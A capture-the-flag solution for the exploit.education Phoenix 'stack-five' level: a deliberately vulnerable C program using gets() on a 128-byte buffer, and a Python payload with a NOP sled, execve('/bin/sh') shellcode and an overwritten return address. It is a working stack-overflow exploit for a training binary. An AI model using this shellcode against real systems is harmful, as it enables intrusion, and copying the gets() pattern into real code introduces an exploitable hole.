# Stack-Five

## Code

```
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

## Solution

First you need to find the address of the buffer and the distance from the address of the return address. In this case the distance is 140 and the buffer starts at 0xffffd660.
Using gdb the address of the buffer could be different from the real one, so we need to use NOP (\x90) and encrease the address (+- 40).

```
buf = "\x90" * 20
buf += "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
buf += "\x90" * (140 - len(buf))
buf += struct.pack("<I", 0xffffd730)
print buf"
```

Then save the output in a file and start the exploit:

```
python ~/stack-five.py > ~/stack-five
cat ~/stack-five - | ./stack-five
```
